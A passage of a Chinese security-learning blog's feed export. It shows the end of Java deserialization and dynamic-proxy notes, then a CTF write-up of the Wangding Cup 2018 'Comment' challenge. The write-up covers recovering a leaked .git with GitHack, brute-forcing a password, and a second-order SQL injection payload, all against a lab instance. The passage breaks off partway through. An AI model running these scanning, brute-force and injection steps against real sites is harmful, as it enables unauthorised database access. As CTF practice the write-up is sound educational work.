class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">HashMap.readObject<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>hash<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>key.hashCode<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>URL.hashCode-&gt;handler.hashCode<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>getHostAddress()<br></code></pre></td></tr></table></figure><h2 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h2><p>对于下面这段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>        sout(<span class="hljs-string">&#x27;拿筷子&#x27;</span>);<br>        sout(<span class="hljs-string">&#x27;盛饭&#x27;</span>);<span class="hljs-comment">//增加的功能</span><br>        sout(<span class="hljs-string">&#x27;吃饭&#x27;</span>);<span class="hljs-comment">//增加的功能</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以无侵入式的给代码增加额外的功能。</p><p><img src="/img/javalearn72.png" alt="javalearn72"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Bigstar.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Bigstar</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Star</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Bigstar</span><span class="hljs-params">()</span>&#123;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Bigstar</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-meta">@override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sing</span><span class="hljs-params">()</span>&#123;<br>        sout(<span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot;正在唱&quot;</span> + name);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;谢谢&quot;</span>;<br>    &#125;<br>    <span class="hljs-meta">@override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dance</span><span class="hljs-params">()</span>&#123;<br>        sout (<span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot;正在跳舞&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//getname setname懒得写了。。。</span><br>&#125;<br><br><br><span class="hljs-comment">//Star.java</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Star</span> &#123;<br>    <br>    <span class="hljs-comment">//我们可以把所有想要被代理的方法定义在接口当中，注意接口里的方法都应是抽象方法</span><br>    <br>    <span class="hljs-comment">//唱</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> String <span class="hljs-title function_">sing</span><span class="hljs-params">(String name)</span>;<br>    <br>    <span class="hljs-comment">//跳</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dance</span><span class="hljs-params">()</span>;<br>    <br>    <br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/img/javalearn73.png" alt="javalearn73"></p><p><img src="/img/javalearn747.png" alt="javalearn747"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//IUser.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IUser</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-comment">//proxtwhat.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">proxywhat</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IUser</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">proxywhat</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br><br>        System.out.println(<span class="hljs-string">&quot;展示&quot;</span>);<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">//proxytest.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">proxytest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">IUser</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">proxywhat</span>();<br>        user.show();<br>    &#125;<br>&#125;<br><span class="hljs-comment">//结果：展示</span><br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyUtil</span> &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    方法作用：给一个明星的对象创建一个代理</span><br><span class="hljs-comment">    形参：被代理的明星对象</span><br><span class="hljs-comment">    返回值：给明星创建的代理</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Star <span class="hljs-title function_">createProxy</span><span class="hljs-params">(BigStar bigstar)</span>&#123;<br>        <br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h3><p>类加载机制：</p><ul><li>类加载与反序列化</li></ul><p>类加载的时候会执行代码</p><p>初始化：静态代码块</p><p>实例化：构造代码块，无参构造函数</p><ul><li>动态类加载方法</li><li></li></ul><p>参考文章：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://blog.csdn.net/mocas_wang/article/details/<span class="hljs-number">107621010</span>?ops_request_misc=%<span class="hljs-number">257</span>B%<span class="hljs-number">2522</span>request%<span class="hljs-number">255</span>Fid%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522170149064516800213084111</span>%<span class="hljs-number">2522</span>%<span class="hljs-number">252</span>C%<span class="hljs-number">2522</span>scm%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">252220140713</span>.<span class="hljs-number">130102334</span>..%<span class="hljs-number">2522</span>%<span class="hljs-number">257</span>D&amp;request_id=<span class="hljs-number">170149064516800213084111</span>&amp;biz_id=<span class="hljs-number">0</span>&amp;utm_medium=distribute.pc_search_result.none-task-blog-<span class="hljs-number">2</span>~<span class="hljs-literal">all</span>~top_positive~default-<span class="hljs-number">1</span>-<span class="hljs-number">107621010</span>-null-null.<span class="hljs-number">142</span>^v96^pc_search_result_base9&amp;utm_term=mocas_wang&amp;spm=<span class="hljs-number">1018</span>.<span class="hljs-number">2226</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">4187</span><br><span class="hljs-attribute">https</span>://blog.csdn.net/qq_62414755/article/details/<span class="hljs-number">125886742</span>?ops_request_misc=%<span class="hljs-number">257</span>B%<span class="hljs-number">2522</span>request%<span class="hljs-number">255</span>Fid%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522170149059516800188587075</span>%<span class="hljs-number">2522</span>%<span class="hljs-number">252</span>C%<span class="hljs-number">2522</span>scm%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">252220140713</span>.<span class="hljs-number">130102334</span>..%<span class="hljs-number">2522</span>%<span class="hljs-number">257</span>D&amp;request_id=<span class="hljs-number">170149059516800188587075</span>&amp;biz_id=<span class="hljs-number">0</span>&amp;utm_medium=distribute.pc_search_result.none-task-blog-<span class="hljs-number">2</span>~<span class="hljs-literal">all</span>~top_click~default-<span class="hljs-number">2</span>-<span class="hljs-number">125886742</span>-null-null.<span class="hljs-number">142</span>^v96^pc_search_result_base9&amp;utm_term=java%E5%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>D%E5%BA%<span class="hljs-number">8</span>F%E5%<span class="hljs-number">88</span>%<span class="hljs-number">97</span>%E5%<span class="hljs-number">8</span>C%<span class="hljs-number">96</span>&amp;spm=<span class="hljs-number">1018</span>.<span class="hljs-number">2226</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">4187</span><br><span class="hljs-attribute">https</span>://blog.csdn.net/mochu7777777/article/details/<span class="hljs-number">130221488</span>?ops_request_misc=%<span class="hljs-number">257</span>B%<span class="hljs-number">2522</span>request%<span class="hljs-number">255</span>Fid%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522170149059516800188587075</span>%<span class="hljs-number">2522</span>%<span class="hljs-number">252</span>C%<span class="hljs-number">2522</span>scm%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">252220140713</span>.<span class="hljs-number">130102334</span>..%<span class="hljs-number">2522</span>%<span class="hljs-number">257</span>D&amp;request_id=<span class="hljs-number">170149059516800188587075</span>&amp;biz_id=<span class="hljs-number">0</span>&amp;utm_medium=distribute.pc_search_result.none-task-blog-<span class="hljs-number">2</span>~<span class="hljs-literal">all</span>~top_positive~default-<span class="hljs-number">1</span>-<span class="hljs-number">130221488</span>-null-null.<span class="hljs-number">142</span>^v96^pc_search_result_base9&amp;utm_term=java%E5%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>D%E5%BA%<span class="hljs-number">8</span>F%E5%<span class="hljs-number">88</span>%<span class="hljs-number">97</span>%E5%<span class="hljs-number">8</span>C%<span class="hljs-number">96</span>&amp;spm=<span class="hljs-number">1018</span>.<span class="hljs-number">2226</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">4187</span><br><span class="hljs-attribute">https</span>://dyfloveslife.github.io/<span class="hljs-number">2020</span>/<span class="hljs-number">03</span>/<span class="hljs-number">21</span>/Serialization-and-Deserialization-in-Java/<br><span class="hljs-attribute">https</span>://websec.readthedocs.io/zh/latest/language/java/unserialize.html<br><span class="hljs-attribute">https</span>://xilitter.github.io/<span class="hljs-number">2023</span>/<span class="hljs-number">02</span>/<span class="hljs-number">23</span>/java%E5%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>D%E5%BA%<span class="hljs-number">8</span>F%E5%<span class="hljs-number">88</span>%<span class="hljs-number">97</span>%E5%<span class="hljs-number">8</span>C%<span class="hljs-number">96</span>%E5%<span class="hljs-number">9</span>F%BA%E7%A1%<span class="hljs-number">80</span>/<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记录一道很有意思的.git泄露题目</title>
    <link href="/2023/12/29/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84.git%E6%B3%84%E9%9C%B2%E9%A2%98%E7%9B%AE/"/>
    <url>/2023/12/29/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84.git%E6%B3%84%E9%9C%B2%E9%A2%98%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<p>思路很新奇，单独从做题记录里拿出来写一下</p><span id="more"></span><hr><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p><img src="/img/wdb2018comment1.png" alt="wdb2018comment1"></p><p>没找到啥提示，<code>dirsearch</code>能扫出<code>.git</code>文件，直接访问发现<code>Forbidden</code></p><p><code>dirsearch -u http://27a5f1ac-984c-46a1-9c73-0fc68067d28c.node4.buuoj.cn:81/ --delay 3 -t 30</code></p><p><img src="/img/wdb2018comment3.png" alt="wdb2018comment3"></p><p><code>Githack</code>弄它：</p><p><code>python Githack.py -u http://dd49341c-8374-4a4a-91ac-b258826c8af5.node4.buuoj.cn:81/.git/</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//write_do.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>到这里不会做了。。感觉这个文件没有啥可用的信息？</p><p>我一开始以为<code>$_SESSION[&#39;login&#39;]</code>这里会有利用点。后面看了<code>wp</code>才知道这东西不全。。</p><p><code>Kali</code>下：</p><p><code>python2 GitHack.py http://27a5f1ac-984c-46a1-9c73-0fc68067d28c.node4.buuoj.cn:81/.git</code></p><p>然后进对应文件夹看所有分支提交历史：</p><p><img src="/img/wdb2018comment4.png" alt="wdb2018comment4"></p><p><code>git reset --hard  e5b2a2443c2b6d395d06960123142bc91123148c</code></p><p><img src="/img/wdb2018comment5.png" alt="wdb2018comment5"></p><p>再看<code>write_do.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>这个地方好像没啥可以利用的地方。。</p><p>没给<code>register</code>界面，不过他提示了用户名和密码的一部分，<code>zhangwei``zhangwei***</code>，后面三位抓包爆破就行：<code>zhangwei666</code></p><p>注意这里：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>   <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>   <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>   <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>只做了单纯的转义处理，很容易知道这里可能存在二次注入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//write</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br><span class="hljs-comment">//comment</span><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>   <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure><p><code>$category</code>可以当注入点，抓包看下数据怎么传过去的：</p><p><img src="/img/wdb2018comment6.png" alt="wdb2018comment6"></p><p>CATEGORY字段：<code>test&#39;,content=database()#</code></p><p>这东西放进去就相当于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//write</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;test\&#x27;,content=database()#&#x27;,</span><br><span class="hljs-string">                title = &#x27;2&#x27;,</span><br><span class="hljs-string">                content = &#x27;222&#x27;&quot;</span>;<br><span class="hljs-comment">//comment</span><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>   <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;test&#x27;,content=database()#&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><br><br></code></pre></td></tr></table></figure><p>然后在<code>comment</code>下触发就行。</p><p>但奇怪的是我的<code>payload</code>并没有触发，<code>comment</code>提交后加载不出来。。</p><p>后面才知道对于这种多行的<code>sql</code>语句要用多行注释<code>(\**\)</code>。。</p><p>我当时理解的是:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> comment<br>            <span class="hljs-keyword">set</span> category = <span class="hljs-string">&#x27;&#x27;</span>,content=<span class="hljs-keyword">database</span>()#<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                content = &#x27;</span>$content<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;</span>$bo_id<span class="hljs-string">&#x27;&quot;;</span><br></code></pre></td></tr></table></figure><p><code>database()#</code>里的这个<code>#</code>把后面所有内容全注释掉了，所以随便哪个<code>bo_id</code>中对应的内容都回显库名。</p><p>对于多行<code>sql</code>，举个栗子：</p><p><img src="/img/wdb2018comment7.png" 